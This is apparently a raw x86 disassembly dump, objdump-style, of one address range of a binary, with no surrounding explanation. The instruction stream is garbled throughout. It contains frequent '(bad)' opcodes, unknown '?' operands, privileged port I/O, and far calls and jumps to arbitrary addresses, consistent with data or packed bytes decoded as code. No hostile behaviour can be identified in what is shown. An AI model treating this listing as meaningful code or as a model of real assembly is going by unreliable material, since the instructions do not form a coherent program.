  419dfc:	mov    eax,ds:0xb0b3caf8
  419e01:	int    0xfe
  419e03:	dec    ebx
  419e04:	mov    ch,0x9c
  419e06:	xor    eax,0x31dd3076
  419e0b:	and    al,0x5c
  419e0d:	jle    0x419e4f
  419e0f:	push   ds
  419e10:	adc    eax,0x2f5e0e9a
  419e15:	cld    
  419e16:	push   edx
  419e17:	sbb    eax,0xd822e781
  419e1c:	in     al,dx
  419e1d:	daa    
  419e1e:	push   0x1c6d971b
  419e23:	outs   dx,BYTE PTR ds:[esi]
  419e24:	rol    BYTE PTR [eax],cl
  419e26:	jns    0x419dfa
  419e28:	mov    ebx,0x273e8f96
  419e2d:	loop   0x419db3
  419e2f:	repnz dec edi
  419e31:	sub    bh,BYTE PTR [esi+eax*8]
  419e34:	(bad)
  419e37:	loop   0x419e42
  419e39:	stc    
  419e3a:	jmp    0xdc0ecf03
  419e3f:	push   cs
  419e40:	shl    BYTE PTR [ecx-0x7e],0xc4
  419e44:	jmp    0x419de7
  419e46:	lea    esi,[ecx-0x1ec7ba77]
  419e4c:	retf   
  419e4d:	sbb    DWORD PTR [eax-0x715c6a8d],0x3b707334
  419e57:	lds    ebp,FWORD PTR fs:[ecx-0x418e88f3]
  419e5e:	imul   al
  419e60:	ret    
  419e61:	cs lock xor bl,dh
  419e65:	call   FWORD PTR [ebp+0x10]
  419e68:	in     al,dx
  419e69:	adc    edx,DWORD PTR [edx+0x57]
  419e6c:	int3   
  419e6d:	sbb    ah,bh
  419e6f:	sbb    dl,bh
  419e71:	cld    
  419e72:	int3   
  419e73:	jbe    0x419e7f
  419e75:	adc    esp,DWORD PTR [edi-0x5d]
  419e78:	ja     0x419eb3
  419e7a:	and    al,0x8f
  419e7c:	not    DWORD PTR [eax-0x5a]
  419e7f:	inc    esi
  419e80:	daa    
  419e81:	repz inc edi
  419e83:	mov    ss,WORD PTR [edx]
  419e85:	adc    eax,edx
  419e87:	fmul   DWORD PTR [edi+0x7]
  419e8a:	sti    
  419e8b:	lock aas 
  419e8d:	mov    ds:0x9d8fcd66,al
  419e92:	lock xlat BYTE PTR ds:[ebx]
  419e94:	mov    dl,0x1d
  419e96:	fyl2x  
  419e98:	mov    ds:0xac2bb92b,eax
  419e9d:	enter  0xa703,0xe
  419ea1:	lahf   
  419ea2:	push   es
  419ea3:	push   ss
  419ea4:	or     al,0xf3
  419ea6:	sub    BYTE PTR [edi],0xcc
  419ea9:	sub    BYTE PTR [ecx],cl
  419eab:	sar    DWORD PTR [edi],0x40
  419eae:	ja     0x419f0c
  419eb0:	ss test eax,0x647becd0
  419eb6:	(bad)  
  419eb7:	cdq    
  419eb8:	push   0xffffff99
  419eba:	in     al,0x41
  419ebc:	cwde   
  419ebd:	(bad)  
  419ebe:	es mov ecx,0xdcb3c5a9
  419ec4:	iret   
  419ec5:	jbe    0x419ec6
  419ec7:	in     al,dx
  419ec8:	retf   
  419ec9:	mov    ebp,0xb1fa704b
  419ece:	ror    BYTE PTR [ecx],cl
  419ed0:	mov    esp,0x4898dfd7
  419ed5:	ficom  DWORD PTR [eax+0x9]
  419ed8:	sbb    cl,BYTE PTR [eax]
  419eda:	jnp    0x419f42
  419edc:	dec    eax
  419edd:	test   DWORD PTR [edx],eax
  419edf:	ror    BYTE PTR [edx+0x6a0d053a],1
  419ee5:	pop    ds
  419ee6:	fidivr DWORD PTR [edx-0x29]
  419ee9:	(bad)  
  419eea:	clc    
  419eeb:	inc    edi
  419eec:	fld    TBYTE PTR [esi-0x64]
  419eef:	cdq    
  419ef0:	cmp    BYTE PTR [edx],dh
  419ef2:	js     0x419f64
  419ef4:	pushf  
  419ef5:	sub    al,0x44
  419ef7:	xor    BYTE PTR ds:0x9485472e,cl
  419efd:	sbb    BYTE PTR [edi+esi*4-0x46],0xf4
  419f02:	or     al,0x3f
  419f04:	mov    ?,esp
  419f06:	mov    es,WORD PTR ds:0x89a3504f
  419f0c:	mov    edx,0xbc2fe6b1
  419f11:	cmc    
  419f12:	mov    dh,BYTE PTR ds:0x5a03291a
  419f18:	int    0x58
  419f1a:	stos   BYTE PTR es:[edi],al
  419f1b:	add    DWORD PTR [ebp+0x7bc8c20],esp
  419f21:	in     al,0xc
  419f23:	cmc    
  419f24:	ret    
  419f25:	scas   al,BYTE PTR es:[edi]
  419f26:	inc    ecx
  419f27:	inc    ecx
  419f28:	pop    edx
  419f29:	pop    edx
  419f2a:	fwait
  419f2b:	xchg   esp,eax
  419f2c:	jge    0x419fa0
  419f2e:	push   ebp
  419f2f:	xor    ebx,DWORD PTR [eax+0x5f005a6b]
  419f35:	pusha  
  419f36:	rcl    cl,cl
  419f38:	bnd jns 0x419fb4
  419f3b:	sub    ebp,DWORD PTR [ebx]
  419f3d:	mov    ebp,0x54813817
  419f42:	and    dh,BYTE PTR [ebx]
  419f44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f45:	test   al,0xb2
  419f47:	cs jo  0x419f41
  419f4a:	imul   eax,DWORD PTR [esi],0x4c
  419f4d:	mov    ebx,DWORD PTR [ebp+ebx*1-0x53]
  419f51:	shl    DWORD PTR [edx-0x7e],0x67
  419f55:	test   eax,0xf4bf4248
  419f5a:	add    eax,0x1fd6e4d4
  419f5f:	in     al,dx
  419f60:	in     eax,0x78
  419f62:	jp     0x419f28
  419f64:	aam    0x3c
  419f66:	xchg   ebp,eax
  419f67:	mov    esp,0x35c77495
  419f6c:	xchg   esp,eax
  419f6d:	in     eax,0x11
  419f6f:	pushf  
  419f70:	ror    BYTE PTR [eax+0x3c],1
  419f73:	add    al,0xfd
  419f75:	call   0x525e:0xe0015700
  419f7c:	sub    edx,ebp
  419f7e:	(bad)  
  419f7f:	out    dx,al
  419f80:	adc    DWORD PTR [ecx-0x63],ebp
  419f83:	and    ah,dl
  419f85:	mov    ah,0xc5
  419f87:	sbb    al,0x88
  419f89:	outs   dx,DWORD PTR ds:[esi]
  419f8a:	data16 ja 0x41a004
  419f8d:	push   edx
  419f8e:	sbb    esi,DWORD PTR [esi]
  419f90:	mov    edi,DWORD PTR [ebp*1-0x3992a79f]
  419f97:	xchg   ebp,eax
  419f98:	sbb    dh,cl
  419f9a:	dec    ecx
  419f9b:	pop    esp
  419f9c:	inc    edi
  419f9d:	inc    edi
  419f9e:	mov    dh,BYTE PTR [esi+eiz*8-0x10]
  419fa2:	mov    ecx,0x2ca14fbe
  419fa7:	jmp    0x419fe4
  419fa9:	mov    es,WORD PTR [edx+0x3a]
  419fac:	pop    esp
  419fad:	cmp    al,0x9c
  419faf:	push   eax
  419fb0:	in     eax,0xd1
  419fb2:	dec    ecx
  419fb3:	ds pushf 
  419fb5:	les    edi,FWORD PTR ds:0xb9ae15cb
  419fbb:	adc    ebp,edi
  419fbd:	enter  0x334b,0x1c
  419fc1:	push   es
  419fc2:	out    dx,eax
  419fc3:	mov    bh,0xa5
  419fc5:	jl     0x41a028
  419fc7:	stos   BYTE PTR es:[edi],al
  419fc8:	xor    eax,0x5b9ee489
  419fcd:	outs   dx,BYTE PTR ds:[esi]
  419fce:	sbb    ebx,DWORD PTR [esi-0x71]
  419fd1:	scas   al,BYTE PTR es:[edi]
  419fd2:	jnp    0x419f84
  419fd4:	addr16 or al,0xa6
  419fd7:	xor    ebp,DWORD PTR [ecx]
  419fd9:	es test eax,0xa9c1c22c
  419fdf:	jecxz  0x419fdb
  419fe1:	jbe    0x419fcd
  419fe3:	and    DWORD PTR [eax-0x3c],0x9a056812
  419fea:	inc    esi
  419feb:	fmul   QWORD PTR [ebp+0x5]
  419fee:	mov    fs:0x18cf9706,al
  419ff4:	dec    eax
  419ff5:	ret    0x3f0f
  419ff8:	retf   
  419ff9:	imul   DWORD PTR [ecx-0x55d74dad]
  419fff:	je     0x419fe7
  41a001:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a002:	call   esp
  41a004:	cmp    al,0x75
  41a006:	data16 or BYTE PTR [eax],cl
  41a009:	inc    ebx
  41a00a:	(bad)  
  41a00b:	outs   dx,DWORD PTR ds:[esi]
  41a00c:	lods   eax,DWORD PTR ds:[esi]
  41a00d:	fld    DWORD PTR [esi-0x1d]
  41a010:	mov    ecx,0x4522e654
  41a015:	sbb    edi,eax
  41a017:	mov    eax,0x20d2165b
  41a01c:	clc    
  41a01d:	cwde   
  41a01e:	lock sub esp,ebx
  41a021:	push   esi
  41a022:	pop    eax
  41a023:	xchg   edx,eax
  41a024:	dec    esp
  41a025:	call   0xdb1fa288
  41a02a:	repz std 
  41a02c:	mov    ch,0x80
  41a02e:	nop
  41a02f:	mov    ebx,0x69c4fb5e
  41a034:	call   0x59ce:0xaff8fc14
  41a03b:	call   0x55c:0x7bfec99c
  41a042:	arpl   sp,cx
  41a044:	adc    eax,ecx
  41a046:	pop    es
  41a047:	js     0x41a093
  41a049:	adc    BYTE PTR [edi],cl
  41a04b:	and    al,0xb5
  41a04d:	cmp    al,BYTE PTR ds:0x94ba02e6
  41a053:	jae    0x41a0a9
  41a055:	adc    cl,BYTE PTR [esi+ebx*4+0x135f9e58]
  41a05c:	mov    edx,0x269fb945
  41a061:	jns    0x419ff1
  41a063:	jg     0x41a0a0
  41a065:	cmp    eax,0xabf231e6
  41a06a:	xor    esi,ecx
  41a06c:	test   eax,0xf02efd3b
  41a071:	sbb    DWORD PTR [ebx-0x27],esi
  41a074:	and    cl,BYTE PTR [ebx]
  41a076:	xchg   ebx,eax
  41a077:	neg    BYTE PTR [ebx+0x3d]
  41a07a:	xor    edi,edx
  41a07c:	or     bl,BYTE PTR [esi]
  41a07e:	inc    ebx
  41a07f:	mov    dh,0xb3
  41a081:	push   eax
  41a082:	outs   dx,BYTE PTR ds:[esi]
  41a083:	xor    al,0x14
  41a085:	inc    ecx
  41a086:	aas    
  41a087:	jo     0x41a0c6
  41a089:	dec    edi
  41a08a:	loopne 0x41a069
  41a08c:	push   eax
  41a08d:	jns    0x41a08b
  41a08f:	pop    ecx
  41a090:	sub    ch,BYTE PTR [ebp+0x15e052c0]
  41a096:	or     DWORD PTR [edx-0xd47ddfc],edi
  41a09c:	test   DWORD PTR [ebx+0x4f],edi
  41a09f:	mov    ds:0xd04f2289,al
  41a0a4:	cmp    BYTE PTR [edi-0x3489eab0],al
  41a0aa:	mov    dl,0xc8
  41a0ac:	lahf   
  41a0ad:	test   eax,0x26868224
  41a0b2:	(bad)  
  41a0b3:	frstor [ebx+0x33]
  41a0b6:	mov    ebp,0x47952cc5
  41a0bb:	aam    0xd4
  41a0bd:	shl    ebx,1
  41a0bf:	mov    ebx,DWORD PTR [ecx-0x31]
  41a0c2:	mov    edx,0x25035ac8
  41a0c7:	sub    al,0x83
  41a0c9:	retf   
  41a0ca:	(bad)  
  41a0cb:	mov    eax,ds:0xe09460a6
  41a0d0:	enter  0x8e69,0x88
  41a0d4:	ds scas eax,DWORD PTR es:[edi]
  41a0d6:	jbe    0x41a076
  41a0d8:	lods   al,BYTE PTR ds:[esi]
  41a0d9:	inc    edi
  41a0da:	jp     0x41a0db
  41a0dc:	fnstcw WORD PTR [esi]
  41a0de:	test   eax,ebp
  41a0e0:	hlt    
  41a0e1:	fstp   DWORD PTR [edx-0x67]
  41a0e4:	aam    0xad
  41a0e6:	hlt    
  41a0e7:	stc    
  41a0e8:	adc    eax,0x5b05430e
  41a0ed:	mov    ah,0x70
  41a0ef:	add    eax,0xed78ac28
  41a0f4:	call   0xfce3:0xbc0f69f8
  41a0fb:	test   eax,0x9e683c34
  41a100:	(bad)  
  41a101:	xor    al,BYTE PTR [eax+0x6c]
  41a104:	sbb    BYTE PTR [edx+0x3b],al
  41a107:	and    DWORD PTR [edx],esi
  41a109:	mov    ch,0x47
  41a10b:	popw   ss
  41a10d:	daa    
  41a10e:	mov    ds:0x26f2b3ed,al
  41a113:	xlat   BYTE PTR ds:[ebx]
  41a114:	pop    eax
  41a115:	pop    ebp
  41a116:	test   DWORD PTR [ecx-0x2baf2f1a],esi
  41a11c:	ficom  DWORD PTR [ecx+0x58f109be]
  41a122:	or     al,0x3d
  41a124:	mov    edi,0xf94cc9ce
  41a129:	rcl    DWORD PTR [esp+eiz*2],cl
  41a12c:	xlat   BYTE PTR ds:[ebx]
  41a12d:	inc    ebx
  41a12e:	mov    esp,0x5c0c3f8b
  41a133:	enter  0xc008,0x6a
  41a137:	es aaa 
  41a139:	sbb    eax,0xbc1ec268
  41a13e:	cdq    
  41a13f:	mov    ebx,0x3af10ba4
  41a144:	cmp    al,BYTE PTR [esi-0x2c9a1e69]
  41a14a:	cld    
  41a14b:	ja     0x41a1bd
  41a14d:	inc    eax
  41a14e:	mov    esp,0xa07aa8fe
  41a153:	in     eax,dx
  41a154:	jns    0x41a0e9
  41a156:	inc    eax
  41a157:	ficom  WORD PTR [ebx+0x2238a3a9]
  41a15d:	test   dl,ah
  41a15f:	sub    al,0x14
  41a161:	mov    al,0x2d
  41a163:	icebp  
  41a164:	sub    dl,BYTE PTR [ebx+0x19]
  41a167:	stc    
  41a168:	pop    ebx
  41a169:	sub    bl,al
  41a16b:	and    eax,0xd497c38
  41a170:	(bad)  
  41a171:	fsubr  QWORD PTR [ebp+0x47c1175]
  41a177:	xor    al,0x2c
  41a179:	and    BYTE PTR [ebx-0x28d665a4],ah
  41a17f:	pop    edx
  41a180:	enter  0x4dbe,0x15
  41a184:	je     0x41a1d3
  41a186:	sub    DWORD PTR [eax+0x77],ebx
  41a189:	adc    ebp,DWORD PTR [ecx-0x359f2e45]
  41a18f:	nop
  41a190:	jmp    0x1c8d:0x3d88dc55
  41a197:	mov    eax,ds:0x3399d484
  41a19c:	je     0x41a1bd
  41a19e:	mov    bl,0x9b
  41a1a0:	out    0x8c,eax
  41a1a2:	sub    esi,edi
  41a1a4:	mov    ebp,0xe4ba8636
  41a1a9:	and    al,0x44
  41a1ab:	je     0x41a195
  41a1ad:	add    eax,0xa167ddb2
  41a1b2:	sbb    al,0x5e
  41a1b4:	(bad)  
  41a1b6:	xchg   edx,eax
  41a1b7:	xor    eax,0x45daea8a
  41a1bc:	mov    esi,0x25038abb
  41a1c1:	pop    esp
  41a1c2:	stos   BYTE PTR es:[edi],al
  41a1c3:	push   esp
  41a1c4:	mov    al,0xb
  41a1c6:	adc    DWORD PTR [esi+0x19],ebp
  41a1c9:	aas    
  41a1ca:	ror    DWORD PTR [edi+0x7f],1
  41a1cd:	push   esp
  41a1ce:	fcomi  st,st(4)
  41a1d0:	into   
  41a1d1:	sti    
  41a1d2:	or     BYTE PTR [edx-0x6955d666],dh
  41a1d8:	push   ds
  41a1d9:	pop    ebx
  41a1da:	jae    0x41a21c
  41a1dc:	pop    ebp
  41a1dd:	(bad)  
  41a1de:	cdq    
  41a1df:	push   edx
  41a1e0:	sbb    DWORD PTR [ebx+0xf],ecx
  41a1e3:	or     eax,0x6f1cfe84
  41a1e8:	arpl   WORD PTR [ecx],cx
  41a1ea:	jne    0x41a258
  41a1ec:	sub    edi,esp
  41a1ee:	scas   al,BYTE PTR es:[edi]
  41a1ef:	add    edx,DWORD PTR [edx]
  41a1f1:	call   0xa4e3:0x77855f00
  41a1f8:	push   eax
  41a1f9:	out    dx,al
  41a1fa:	cli    
  41a1fb:	(bad)  
  41a1fc:	test   eax,0xf417e6a
  41a201:	das    
  41a202:	pop    eax
  41a203:	out    dx,al
  41a204:	mov    ds:0x6fc208dc,eax
  41a209:	adc    ebx,DWORD PTR [esi]
  41a20b:	ret    
  41a20c:	cmp    al,0x76
  41a20e:	mov    ah,0x8f
  41a210:	clc    
  41a211:	and    al,0xd4
  41a213:	push   edx
  41a214:	sar    BYTE PTR [esi+0x4],cl
  41a217:	add    al,0x4c
  41a219:	lea    eax,[esi-0x3021b368]
  41a21f:	scas   eax,DWORD PTR es:[edi]
  41a220:	test   DWORD PTR [ecx+0x33214f00],ecx
  41a226:	mov    dh,0x30
  41a228:	int3   
  41a229:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a22a:	clc    
  41a22b:	inc    ebx
  41a22c:	sti    
  41a22d:	iret   
  41a22e:	mov    ecx,0x8d7c449
  41a233:	mov    WORD PTR [esi-0x20],ds
  41a236:	scas   al,BYTE PTR es:[edi]
  41a237:	jae    0x41a1ff
  41a239:	pop    esi
  41a23a:	cmp    dh,ch
  41a23c:	inc    eax
  41a23d:	push   esi
  41a23e:	daa    
  41a23f:	dec    ebx
  41a240:	popa   
  41a241:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a242:	inc    ecx
  41a243:	int    0xe1
  41a245:	ds ja  0x41a1f0
  41a248:	sub    cl,BYTE PTR [ecx-0x68]
  41a24b:	push   0x79
  41a24d:	add    ch,BYTE PTR [edi+edi*4+0x7c]
  41a251:	call   DWORD PTR [edi]
  41a253:	retf   
  41a254:	jge    0x41a2ac
  41a256:	cmp    al,0x17
  41a258:	fcomp  DWORD PTR [esi-0x18d5b20b]
  41a25e:	inc    esp
  41a25f:	jmp    0x98b80fb4
  41a264:	jnp    0x41a235
  41a266:	xchg   esp,eax
  41a267:	sbb    dh,BYTE PTR [ecx+0x12]
  41a26a:	sub    BYTE PTR [ebx-0xa2f7321],bl
  41a270:	test   BYTE PTR [ebx+0x40],ah
  41a273:	jmp    0x41a220
  41a275:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a276:	dec    edx
  41a277:	lods   al,BYTE PTR ds:[esi]
  41a278:	arpl   WORD PTR [ebx],ax
  41a27a:	jg     0x41a1fd
  41a27c:	mov    eax,ds:0xace3a81a
  41a281:	pop    es
  41a282:	sub    al,0xaa
  41a284:	jl     0x41a294
  41a286:	cdq    
  41a287:	and    DWORD PTR [eax+0x6a],edi
  41a28a:	jecxz  0x41a20e
  41a28c:	inc    ecx
  41a28d:	aas    
  41a28e:	aad    0xef
  41a290:	nop
  41a291:	push   edx
  41a292:	push   ebx
  41a293:	shl    DWORD PTR [esi-0x32],cl
  41a296:	and    eax,0xbb5b6d50
  41a29b:	adc    BYTE PTR [eax-0x45],bh
  41a29e:	call   0xd2a7:0x2f3ef943
  41a2a5:	addr16 fptan 
  41a2a8:	xchg   ecx,eax
  41a2a9:	mov    BYTE PTR [ebp-0x44],bl
  41a2ac:	sub    DWORD PTR [bp+0xa],esp
  41a2b0:	xchg   edx,eax
  41a2b1:	outs   dx,DWORD PTR ds:[esi]
  41a2b2:	mov    al,ds:0xc18b0a6c
  41a2b7:	xchg   ecx,eax
  41a2b8:	mov    eax,0x90222c57
  41a2bd:	push   es
  41a2be:	sbb    BYTE PTR [edi-0x39],al
  41a2c1:	xor    DWORD PTR [eax],edx
  41a2c3:	jmp    0xd4564478
  41a2c8:	cmc    
  41a2c9:	and    al,0x2b
  41a2cb:	inc    ebp
  41a2cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2cd:	pop    esi
  41a2ce:	jbe    0x41a322
  41a2d0:	les    ecx,FWORD PTR [edi]
  41a2d2:	dec    esi
  41a2d3:	xchg   edx,eax
  41a2d4:	sub    esp,0xffffffd5
  41a2d7:	dec    edi
  41a2d8:	scas   eax,DWORD PTR es:[edi]
  41a2d9:	xor    DWORD PTR [ebx+0x330a09fb],eax
  41a2df:	and    eax,0x6d5d180c
  41a2e4:	cs dec esi
  41a2e6:	mov    ds,WORD PTR [ebp-0x25]
  41a2e9:	out    dx,al
  41a2ea:	lods   al,BYTE PTR gs:[esi]
  41a2ec:	retf   0xa399
  41a2ef:	shl    DWORD PTR [ecx],cl
  41a2f1:	jae    0x41a2d6
  41a2f3:	dec    ebp
  41a2f4:	(bad)  
  41a2f5:	out    dx,al
  41a2f6:	into   
  41a2f7:	jle    0x41a2dd
  41a2f9:	int    0xee
  41a2fb:	lock mov bl,0x8e
  41a2fe:	lods   eax,DWORD PTR ds:[esi]
  41a2ff:	mov    eax,ds:0xf7f444
  41a304:	inc    DWORD PTR [esi-0x75]
  41a307:	retf   0x4582
  41a30a:	pusha  
  41a30b:	cmp    DWORD PTR [eax-0x709005ec],edi
  41a311:	adc    eax,0xd0788788
  41a316:	les    ebp,FWORD PTR [eax+esi*1-0x2438f8c0]
  41a31d:	sbb    DWORD PTR [edx-0x6b],ebx
  41a320:	test   BYTE PTR [ecx],dh
  41a322:	or     al,0xd8
  41a324:	sub    DWORD PTR [ecx],edi
  41a326:	in     eax,0xb
  41a328:	fimul  WORD PTR [edi+0x6bb54800]
  41a32e:	test   eax,0x6510790b
  41a333:	pop    ebx
  41a334:	push   ds
  41a335:	add    eax,0xaf0c9ef3
  41a33a:	mov    ?,WORD PTR [edi-0x1e809fec]
  41a340:	(bad)  [edi-0x4f34bd96]
  41a346:	pop    ss
  41a347:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a348:	pop    es
  41a349:	inc    esi
  41a34a:	sub    ch,BYTE PTR [edi-0x28]
  41a34d:	iret   
  41a34e:	jge    0x41a313
  41a350:	dec    ebp
  41a351:	aam    0xa2
  41a353:	add    eax,0xc0b7133e
  41a358:	inc    ebp
  41a359:	int    0x75
  41a35b:	add    BYTE PTR [esp+ebx*8+0x2544e0cd],bh
  41a362:	pop    esp
  41a363:	inc    edx
  41a364:	dec    ebx
  41a365:	call   DWORD PTR [ecx]
  41a367:	mov    dl,0x69
  41a369:	add    eax,edi
  41a36b:	scas   eax,DWORD PTR es:[edi]
  41a36c:	inc    esp
  41a36d:	mov    edi,0xbbbf6725
  41a372:	jmp    0x41a39c
  41a374:	sti    
  41a375:	push   cs
  41a376:	jmp    0x41a324
  41a378:	popf   
  41a379:	daa    
  41a37a:	in     al,dx
  41a37b:	rcr    BYTE PTR [edi+0x38805060],cl
  41a381:	adc    BYTE PTR [edi],dh
  41a383:	popa   
  41a384:	inc    ebx
  41a385:	mov    bh,0x3e
  41a387:	or     DWORD PTR [ebp-0x47],edx
  41a38a:	jecxz  0x41a3fb
  41a38c:	call   0x914c:0xfbc60cdf
  41a393:	das    
  41a394:	add    eax,0xe4d2d046
  41a399:	or     BYTE PTR [bx+di-0x15],ah
  41a39d:	xchg   al,dl
  41a39f:	fimul  WORD PTR [ecx+0x5a]
  41a3a2:	push   ebx
  41a3a3:	repnz nop
  41a3a5:	shr    BYTE PTR [esi+0x46],0xa4
  41a3a9:	add    ebx,DWORD PTR ds:0x88aa71e7
  41a3af:	jne    0x41a420
  41a3b1:	sbb    cl,BYTE PTR [edx+0x505aa034]
  41a3b7:	(bad)  
  41a3b8:	fsubr  DWORD PTR [eax-0x67]
  41a3bb:	std    
  41a3bc:	push   ss
  41a3bd:	dec    eax
  41a3be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3bf:	retf   
  41a3c0:	mov    esi,0x99ba3c2c
  41a3c5:	pop    esi
  41a3c6:	das    
  41a3c7:	daa    
  41a3c8:	scas   eax,DWORD PTR es:[edi]
  41a3c9:	mov    ds:0x9a96e7f5,al
  41a3ce:	jbe    0x41a44d
  41a3d0:	inc    edx
  41a3d1:	in     eax,dx
  41a3d2:	(bad)  
  41a3d3:	repnz mov ds:0x157c1b2b,eax
  41a3d9:	inc    edi
  41a3da:	mov    dl,0xe6
  41a3dc:	aam    0xfe
  41a3de:	(bad)  
  41a3df:	in     eax,0x4a
  41a3e1:	jecxz  0x41a3de
  41a3e3:	fsub   DWORD PTR [edi+0x3]
  41a3e6:	lods   al,BYTE PTR ds:[esi]
  41a3e7:	mov    esp,0x919e11e4
  41a3ec:	dec    esp
  41a3ed:	jb     0x41a41f
  41a3ef:	mov    ch,0x66
  41a3f1:	inc    ebx
  41a3f2:	sahf   
  41a3f3:	stos   DWORD PTR es:[edi],eax
  41a3f4:	call   0xa3826c56
  41a3f9:	mov    ch,0xb9
  41a3fb:	in     eax,dx
  41a3fc:	pop    ss
  41a3fd:	leave  
  41a3fe:	or     eax,DWORD PTR [edi]
  41a400:	cmp    DWORD PTR [edi+esi*4],ecx
  41a403:	push   ecx
  41a404:	and    edx,DWORD PTR [edi-0x1e]
  41a407:	pop    ecx
  41a408:	pop    ebx
  41a409:	xor    ah,BYTE PTR [ebx-0x2]
  41a40c:	int    0xf
  41a40e:	sar    DWORD PTR [ebp-0x5e503550],0xe4
  41a415:	aaa    
  41a416:	int    0x40
  41a418:	pop    esi
  41a419:	outs   dx,BYTE PTR ds:[esi]
  41a41a:	dec    ebp
  41a41b:	sub    dl,BYTE PTR [eax]
  41a41d:	jns    0x41a40d
  41a41f:	push   ds
  41a420:	and    esp,DWORD PTR [ebp+0x4c]
  41a423:	mov    edx,0xe8c1c35e
  41a428:	frstor [esi+0x68]
  41a42b:	and    ah,BYTE PTR [ecx+eax*1-0x31]
  41a42f:	xor    ecx,DWORD PTR [eax+eiz*8+0x4549534b]
  41a436:	xchg   edi,eax
  41a437:	add    al,0xfe
  41a439:	lock cld 
  41a43b:	out    dx,al
  41a43c:	in     eax,0xe8
  41a43e:	scas   ax,WORD PTR es:[edi]
  41a440:	inc    ebp
  41a441:	iret   
  41a442:	cwde   
  41a443:	pop    ds
  41a444:	jecxz  0x41a3d0
  41a446:	lahf   
  41a447:	neg    DWORD PTR [ecx+0x2e]
  41a44a:	cs sub edi,esi
  41a44d:	cmp    ah,BYTE PTR [ecx+0x10]
  41a450:	aas    
  41a451:	mov    cs,WORD PTR [edx+ecx*4+0x2c9a1313]
  41a458:	or     al,BYTE PTR [edi+0x43]
  41a45b:	fist   WORD PTR [eax+0x6f660874]
  41a461:	add    eax,DWORD PTR [eax+0x80f5896]
  41a467:	or     edi,edi
  41a469:	neg    bh
  41a46b:	loopne 0x41a45a
  41a46d:	sub    al,0xee
  41a46f:	mov    ecx,0x35a14eb
  41a474:	pop    esp
  41a475:	and    DWORD PTR [eax+esi*2-0x5e8d9dc3],ebx
  41a47c:	popa   
  41a47d:	cdq    
  41a47e:	arpl   WORD PTR [edx-0x67],cx
  41a481:	xlat   BYTE PTR ds:[ebx]
  41a482:	xchg   DWORD PTR cs:0x3bc8ba4c,ecx
  41a489:	mov    ds:0xd445f664,al
  41a48e:	sbb    eax,0x7f36915b
  41a493:	sub    esi,DWORD PTR [ebx+0x474b14c6]
  41a499:	mov    al,BYTE PTR [edx+0x5d3c3fef]
  41a49f:	fst    QWORD PTR ds:0x164ecd41
  41a4a5:	xchg   DWORD PTR [ebx+edi*4-0x4e9f2fc2],eax
  41a4ac:	shr    DWORD PTR [ecx+0x9],0x32
  41a4b0:	ss icebp 
  41a4b2:	loopne 0x41a45d
  41a4b4:	jns    0x41a456
  41a4b6:	sahf   
  41a4b7:	adc    al,0x97
  41a4b9:	test   DWORD PTR [eax-0x169fa9b0],ebx
  41a4bf:	es in  al,dx
  41a4c1:	dec    ch
  41a4c3:	jo     0x41a462
  41a4c5:	xor    DWORD PTR [ecx-0x5a],esp
  41a4c8:	ret    
  41a4c9:	(bad)  
  41a4cb:	scas   al,BYTE PTR es:[edi]
  41a4cc:	inc    ebp
  41a4cd:	or     al,0xfd
  41a4cf:	push   0x2599cfd4
  41a4d4:	shl    DWORD PTR [eax-0x59944ab9],1
  41a4da:	(bad)  [esi+ebx*1-0x673e4d51]
  41a4e1:	adc    dh,BYTE PTR [ecx]
  41a4e3:	adc    ch,BYTE PTR [edx+ecx*2]
  41a4e6:	iret   
  41a4e7:	gs add dh,cl
  41a4ea:	mov    ebp,0x900afd0d
  41a4ef:	ss xor ah,bl
  41a4f2:	dec    eax
  41a4f3:	ret    0x3c88
  41a4f6:	or     al,0x72
  41a4f8:	sar    BYTE PTR [edi],1
  41a4fa:	mov    ah,0x1e
  41a4fc:	test   ch,ch
  41a4fe:	loope  0x41a4cf
  41a500:	out    0x6f,eax
  41a502:	inc    edx
  41a503:	and    DWORD PTR [ebx],eax
  41a505:	sar    DWORD PTR [ecx-0x295f43d6],0x92
  41a50c:	sti    
  41a50d:	sub    al,0x46
  41a50f:	pop    eax
  41a510:	out    dx,eax
  41a511:	mov    WORD PTR [ecx+edx*1+0x189d3c1],es
  41a518:	mov    DWORD PTR [ecx*8+0x53d1f4f3],ecx
  41a51f:	imul   edx,DWORD PTR [ebx+ebp*1],0xffffffc4
  41a523:	mov    DWORD PTR [edx+0x59],esp
  41a526:	jg     0x41a4e7
  41a528:	(bad)  
  41a529:	mov    ds:0x1b71fade,eax
  41a52e:	(bad)  
  41a52f:	loopne 0x41a4ce
  41a531:	ss js  0x41a538
  41a534:	pop    eax
  41a535:	mov    cl,0x73
  41a537:	dec    esi
  41a538:	add    ebx,ebp
  41a53a:	sar    cl,0xe4
  41a53d:	cwde   
  41a53e:	test   eax,0x3398548
  41a543:	inc    ebp
  41a544:	addr16 (bad) 
  41a546:	jecxz  0x41a583
  41a548:	push   ecx
  41a549:	dec    eax
  41a54a:	repnz mov ecx,eax
  41a54d:	mov    esp,0x3ebe9cbb
  41a552:	jecxz  0x41a513
  41a554:	sbb    DWORD PTR [eax-0x5912d1cb],0x10ed514e
  41a55e:	push   edi
  41a55f:	loope  0x41a4f7
  41a561:	xchg   ebp,eax
  41a562:	cmc    
  41a563:	jecxz  0x41a564
  41a565:	in     eax,0xbb
  41a567:	fcomp  DWORD PTR cs:[ebp-0x2f]
  41a56b:	aam    0x65
  41a56d:	ins    BYTE PTR es:[edi],dx
  41a56e:	rcr    DWORD PTR [edi],cl
  41a570:	cmp    al,0xdc
  41a572:	push   ebx
  41a573:	cmc    
  41a574:	leave  
  41a575:	add    ebp,DWORD PTR [edx-0x8a192f4]
  41a57b:	(bad)  
  41a57c:	pop    esp
  41a57d:	ret    
  41a57e:	pop    ds
  41a57f:	pop    DWORD PTR [edi+ebx*1+0x5e]
  41a583:	dec    esp
  41a584:	jge    0x41a538
  41a586:	mov    ds:0x76dd404a,al
  41a58b:	ret    0xb81f
  41a58e:	and    esp,DWORD PTR [edx+0x78]
